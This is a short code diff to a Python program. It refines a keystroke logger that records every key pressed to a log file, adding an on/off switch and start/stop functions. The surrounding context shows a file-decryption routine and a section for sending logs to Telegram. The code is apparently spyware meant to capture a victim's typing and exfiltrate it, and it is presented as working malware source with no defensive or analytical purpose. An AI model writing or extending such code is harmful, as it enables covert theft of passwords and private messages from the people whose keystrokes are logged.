@@ -49,19 +49,27 @@ def decrypt_file():
     return decrypted_data
 
 # --- Keystroke Logger ---
+_keylogger_active = threading.Event()
+
 def log_key(key):
+    if not _keylogger_active.is_set():
+        return
     try:
         with open(LOG_FILE, "a") as logfile:
             logfile.write(f"{key.char}")
     except AttributeError:
-        # Handle special keys (e.g., space, enter)
         with open(LOG_FILE, "a") as logfile:
             logfile.write(f"[{key}]")
 
-# Listener thread
-def start_keylogger():
+def start_keylogger(log_file=LOG_FILE):
+    global _keylogger_active
+    _keylogger_active.set()
     with keyboard.Listener(on_press=log_key) as listener:
         listener.join()
+
+def stop_keylogger():
+    global _keylogger_active
+    _keylogger_active.clear()
 
 # --- Communication with Telegram ---
 def send_logs_to_telegram():
